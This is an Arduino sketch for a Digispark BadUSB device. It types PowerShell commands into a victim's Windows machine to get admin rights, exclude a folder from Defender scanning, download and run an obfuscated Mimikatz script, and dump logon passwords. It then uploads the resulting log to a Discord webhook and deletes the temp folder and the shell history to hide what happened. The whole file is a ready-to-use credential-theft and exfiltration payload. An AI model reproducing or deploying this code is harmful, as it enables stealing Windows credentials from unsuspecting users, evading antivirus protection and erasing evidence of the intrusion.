#include "DigiKeyboard.h"
#define KEY_ENTER 0x28

void setup() {
	pinMode(1, OUTPUT); //LED on Model A
}
void loop() {
	DigiKeyboard.sendKeyStroke(0);
	// Download and Execute mimikatz.ps1
	// send data via discord webhook
  DigiKeyboard.delay(500);
	DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
	DigiKeyboard.delay(500);
	DigiKeyboard.print("powershell -Noprofile \"Start-Process powershell -verb runas\"");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(1500);
	DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_Y);
	DigiKeyboard.delay(1000);
	DigiKeyboard.print("cd C:\\ ; mkdir temp ; cd temp ; Add-MpPreference -ExclusionPath \"C:\\temp\" ; Set-ExecutionPolicy unrestricted");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(500);
	DigiKeyboard.print("A");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.print("clear");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(500);
	DigiKeyboard.print("iwr https://raw.githubusercontent.com/HernanRodriguez1/MimikatzFUD/main/Invoke-M1m1fud2.ps1 -OutFile Invoke-M1m1fud2.ps1");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(4000);
	DigiKeyboard.print(". .\\Invoke-M1m1fud2.ps1 ; Invoke-M1m1fud");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(5000);
	DigiKeyboard.print("privilege::debug");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(750);
	DigiKeyboard.print("log");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(750);
	// You can add extra commands in mimikatz from this point on
	DigiKeyboard.print("sekurlsa::logonpasswords");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.print("exit");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(8750);
	DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
	DigiKeyboard.delay(1500);
	DigiKeyboard.print("powershell -Noprofile \"Start-Process powershell -verb runas\"");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(1500);
	DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_Y);
	DigiKeyboard.delay(1000);
	DigiKeyboard.print("cd C:\\temp");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(500);
	DigiKeyboard.print("$webhook=\"DISCORD_WEBHOOK\"");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(500);
	DigiKeyboard.print("$content='Flipper Flap Feport'; $payload=[PSCustomObject]@{ content=$content }");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(500);
	DigiKeyboard.print("Invoke-RestMethod -ContentType \"Application/Json\" -Uri $webhook -Method Post -Body ($payload | ConvertTo-Json) ; curl.exe -F \"file1=@mimikatz.log\" $webhook");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(1000);
	DigiKeyboard.print("Remove-MpPreference -ExclusionPath \"C:\\temp\" ; Set-ExecutionPolicy restricted");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(1500);
	DigiKeyboard.print("A");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(500);
	DigiKeyboard.print("clear ; cd .. ; rm -r temp ; Remove-Item (Get-PSreadlineOption).HistorySavePath");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(500);
	DigiKeyboard.print("exit");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	digitalWrite(1, HIGH); //turn on led when finished
	DigiKeyboard.delay(90000);
	digitalWrite(1, LOW);
	DigiKeyboard.delay(5000);
	for(;;){ /*empty*/ }
}
